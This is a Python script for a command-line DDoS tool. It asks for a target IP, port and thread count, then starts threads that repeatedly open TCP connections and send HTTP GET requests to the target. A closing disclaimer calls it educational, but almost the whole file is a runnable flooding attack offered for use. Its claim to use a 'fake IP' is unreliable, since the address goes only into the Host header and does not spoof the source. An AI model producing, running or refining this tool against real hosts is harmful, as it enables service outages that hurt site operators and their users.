#!/usr/bin/python3
import os
import socket
import threading
import time
from colorama import Fore, Style
def ddos():
    os.system("clear")
    print("press CTRL + C and press ENTER to exit !!!")
    while True:
        try:
            threads = int(input("ENTER NUMBER OF THREADS : "))
        except ValueError:
            print("please enter a integer value")
            continue;
        else:
            break;
    attack_num = 0
    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
    fake = '192.178.1.38'
    #port = 80( default http port is 80)
    while True:
        try:
            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
        except ValueError:
            print("Please enter a valid port , please try again")
            continue;
        else:
            break;
    print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
    time.sleep(4)
    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
    print("seconds : 3")
    time.sleep(1)
    print("seconds : 2")
    time.sleep(1)
    print("seconds : 1")
    time.sleep(1)

    def attack():
        nonlocal attack_num
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((trget, port))
                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))

                attack_num += 1
                print("packet send!! attack number : "+ str(attack_num))
            except socket.error:
                print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                break
                s.close()

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()
def print_red_centered_art():
    os.system("clear")
    art = '''
     

▒█▀▀▄ ▒█▀▀▄ █▀▀█ █▀▀ 
▒█░▒█ ▒█░▒█ █░░█ ▀▀█ 
▒█▄▄▀ ▒█▄▄▀ ▀▀▀▀ ▀▀▀
    '''
    red_art = f"{Fore.RED}{art}{Style.RESET_ALL}"  # Set the text color to red
    print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
    #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
    art2 = ''' 

░█▀▀█ █── ─▀─ ▀▀█▀▀ ▀▀█
░█▀▀▄ █── ▀█▀ ──█── ▄▀─
░█▄▄█ ▀▀▀ ▀▀▀ ──▀── ▀▀▀
    ''' 
    red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
    print(red_art2.center(80))
    print(Fore.YELLOW + Style.BRIGHT + "[the developer is not rensponsible for any kind of illegal activity done with this tool, this tool only represents how ddos attacks work and it is made for educational purposes.]")
if __name__ == "__main__":
    print_red_centered_art()
def menu():
   # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
    print(Fore.WHITE + Style.BRIGHT + "please select from the following options...")
    print(Fore.WHITE + Style.BRIGHT + "1. DDos a website.  [1]")
    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
    print("Enter your options .. [e.g 1,2]") 
    global usr
    usr = input(Fore.GREEN + Style.BRIGHT + ">>>> " )
    if usr == "1":
        ddos()
    elif usr == "2":
        print("Exiting...")
        time.sleep(1)
    else:
        print("invalid option..try again.")
        menu()
menu()
